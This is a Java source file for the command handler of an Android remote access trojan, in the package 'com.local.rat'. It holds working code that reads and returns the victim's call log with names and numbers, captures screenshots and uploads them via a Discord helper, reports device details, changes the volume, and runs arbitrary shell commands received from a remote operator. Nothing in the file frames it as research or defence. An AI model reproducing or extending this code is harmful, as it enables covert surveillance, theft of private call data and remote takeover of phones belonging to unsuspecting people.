package com.local.rat;

import android.content.Context;
import android.database.Cursor;
import android.media.AudioManager;
import android.os.BatteryManager;
import android.provider.CallLog;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Commands {
    private final Context ctx;
    public Commands(Context ctx) { this.ctx = ctx; }

    public String handle(String line) {
        try {
            if (line.equals("calls"))   return calls();
            if (line.equals("battery")) return battery();
            if (line.equals("volup"))   return volume(+1);
            if (line.equals("voldown")) return volume(-1);
            if (line.startsWith("volset ")) return volSet(Integer.parseInt(line.substring(7).trim()));
            if (line.equals("shot"))    return shot();
            if (line.equals("info"))    return info();
            if (line.startsWith("shell ")) return shell(line.substring(6));
            if (line.equals("exit"))    return "bye\n";
            return "err unknown cmd\n";
        } catch (Exception e) {
            return "err " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n";
        }
    }

    private String calls() {
        StringBuilder sb = new StringBuilder("== calls ==\n");
        Cursor c = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC");
        if (c == null) return "err no cursor\n";
        try {
            int n = c.getColumnIndex(CallLog.Calls.NUMBER);
            int t = c.getColumnIndex(CallLog.Calls.TYPE);
            int d = c.getColumnIndex(CallLog.Calls.DATE);
            int u = c.getColumnIndex(CallLog.Calls.DURATION);
            int name = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int i = 0;
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            while (c.moveToNext() && i++ < 200) {
                sb.append(sdf.format(new Date(c.getLong(d))))
                  .append("  ").append(typeStr(c.getInt(t)))
                  .append("  ").append(c.getString(name) != null ? c.getString(name) : "?")
                  .append("  ").append(c.getString(n))
                  .append("  ").append(c.getLong(u)).append("s\n");
            }
        } finally { c.close(); }
        return sb.append("== end ==\n").toString();
    }

    private static String typeStr(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "IN";
            case CallLog.Calls.OUTGOING_TYPE: return "OUT";
            case CallLog.Calls.MISSED_TYPE:   return "MISS";
            case CallLog.Calls.REJECTED_TYPE: return "REJ";
            default: return "?";
        }
    }

    private String battery() {
        BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        if (bm == null) return "err no bat mgr\n";
        int pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        long chargeUah = bm.getLongProperty(BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER);
        long status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
        return "== battery ==\nlevel=" + pct + "%\ncharge_uah=" + chargeUah
                + "\nstatus=" + battStatus((int) status) + "\n";
    }

    private static String battStatus(int s) {
        switch (s) {
            case BatteryManager.BATTERY_STATUS_CHARGING:     return "charging";
            case BatteryManager.BATTERY_STATUS_DISCHARGING:  return "discharging";
            case BatteryManager.BATTERY_STATUS_FULL:         return "full";
            case BatteryManager.BATTERY_STATUS_NOT_CHARGING: return "not_charging";
            default: return "unknown";
        }
    }

    private String volume(int delta) {
        AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return "err no audio\n";
        int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        int cur = am.getStreamVolume(AudioManager.STREAM_MUSIC);
        int next = Math.max(0, Math.min(max, cur + delta));
        am.setStreamVolume(AudioManager.STREAM_MUSIC, next, 0);
        return "vol=" + next + "/" + max + "\n";
    }

    private String volSet(int v) {
        AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return "err no audio\n";
        int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        int next = Math.max(0, Math.min(max, v));
        am.setStreamVolume(AudioManager.STREAM_MUSIC, next, 0);
        return "vol=" + next + "/" + max + "\n";
    }

    private String shot() {
        byte[] png = ScreenCap.capture();
        if (png == null) return "err no projection\n";
        String r = Discord.upload(png, "shot_" + System.currentTimeMillis() + ".png");
        return r + " bytes=" + png.length + "\n";
    }

    private String info() {
        return "== info ==\nmodel=" + android.os.Build.MODEL
                + "\nbrand=" + android.os.Build.BRAND
                + "\nsdk=" + android.os.Build.VERSION.SDK_INT
                + "\nrel=" + android.os.Build.VERSION.RELEASE + "\n";
    }

    private String shell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader e = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = r.readLine()) != null) sb.append(l).append('\n');
            while ((l = e.readLine()) != null) sb.append("ERR: ").append(l).append('\n');
            p.waitFor(); return sb.toString();
        } catch (Exception ex) { return "err " + ex.getMessage() + "\n"; }
    }
}
